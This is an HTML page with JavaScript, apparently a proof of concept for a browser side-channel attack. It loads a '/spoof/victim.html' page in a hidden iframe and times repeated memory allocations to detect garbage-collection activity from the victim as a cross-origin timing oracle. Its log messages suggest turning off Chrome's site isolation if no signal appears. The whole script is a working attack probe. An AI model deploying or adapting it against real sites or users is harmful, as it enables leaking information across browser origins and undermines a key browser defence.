<!doctype html>
<meta charset="utf-8">
<title>GC Oracle FINAL AUTO</title>

<h2>GC Oracle FINAL (Auto Detect)</h2>
<pre id="log"></pre>

<iframe id="f" style="width:0;height:0;border:0"></iframe>

<script>
const log = m => {
  document.getElementById('log').textContent += m + "\n"
  console.log(m)
}

// ===== FORCE SAME PROCESS (best effort) =====
const f = document.getElementById('f')
f.src = "about:blank"
f.onload = () => {
  f.contentWindow.location = "/spoof/victim.html"
}

// ===== HEAVY PROBE =====
function probe() {
  const t0 = performance.now()

  let arr = []
  for (let i = 0; i < 60000; i++) {
    arr.push({a:i, b:i+1})
  }

  // typed array (lebih sensitif GC)
  let buf = new Uint8Array(1024 * 512)

  return performance.now() - t0
}

// ===== MULTI SAMPLE =====
function measure() {
  let sum = 0
  for (let i = 0; i < 3; i++) {
    sum += probe()
  }
  return sum / 3
}

// ===== TRACK =====
let history = []
let detected = false

setInterval(() => {
  const t = measure()
  history.push(t)

  if (history.length > 30) history.shift()

  const avg = history.reduce((a,b)=>a+b,0)/history.length

  let state = "IDLE"
  if (t > 8) state = "GC SPIKE 🔥"
  if (t > 15) state = "HEAVY GC 💣"

  if (t > 8) detected = true

  log(`t=${t.toFixed(2)} avg=${avg.toFixed(2)} => ${state}`)

}, 120)

// ===== FAIL DETECTION =====
setTimeout(() => {
  if (!detected) {
    log("\n[!] No GC signal detected")
    log("[!] Likely different process (Site Isolation aktif)")
    log("[!] Coba:")
    log("    - buka di tab yang sama")
    log("    - pakai Chrome --disable-site-isolation-trials")
  }
}, 8000)
</script>
